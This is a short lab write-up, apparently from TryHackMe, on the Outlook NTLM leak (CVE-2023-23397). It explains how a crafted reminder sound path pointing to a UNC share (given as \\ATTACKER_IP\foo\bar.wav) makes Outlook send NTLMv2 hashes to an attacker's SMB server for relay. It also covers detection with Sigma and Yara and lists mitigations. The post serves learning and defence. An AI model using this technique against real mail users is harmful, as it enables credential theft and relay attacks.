---
layout: post
title: "Outlook NTLM Leak"
date: 2023-06-04 
categories: ["Hands-on", "TryHackMe"]
tags: "TryHackMe","CVE-2023-23397"
---

## CVE-2023-23397
Tool used: **Responder**

**Scenario:**
*The victim recieves a malicous email that redirects them to the attacker's SMB Server. This happens by busing CVE-2023-23397.*

### Exploit
The exploit happens by manipulating the parameter of the reminder sound path location. Simply changing the path wont do anything. the **PidLidReminderFileParameter** should point to **Universal Naming Convention (UNC)** path instead of a local file. **PidLidReminderOverride** should be configured to true to be able to override the default the confirgurations.

When the Victim connects to the attacker's SMB server, the victim's remote server would send the NTLM. The attacker can use the NTLMv2 hash to authenticate by using the relay attack. 

```bash
\\ATTACKER_IP\foo\bar.wav
```

#### Script: to be added

### Mitigation & Detection

**Sigma rules** can be used to detect a connection to a WebDav or SMB share, or detects svchost.exe spawning rundll32.exe both indicates a a post-exploitation but the latter detects exfiltration phase.**Yara Rules** used for pattern identification within the files on a disk to detect the suspcisous MSG file on the disk. In response to the attack, Microsoft released a **Powershell script** that can check the exchange messaging items like Mail, Calendar, and tasks to see if the IOC is present.

**Mitigation**:
- Add users to the Protected Users Security Group, which prevents using NTLM as an authentication mechanism.
- Block TCP 445/SMB outbound from your network to avoid any post-exploitation connection.
- Use the PowerShell script released by Microsoft to scan against the Exchange server to detect any attack attempt.
- Disable WebClient service to avoid webdav connection.
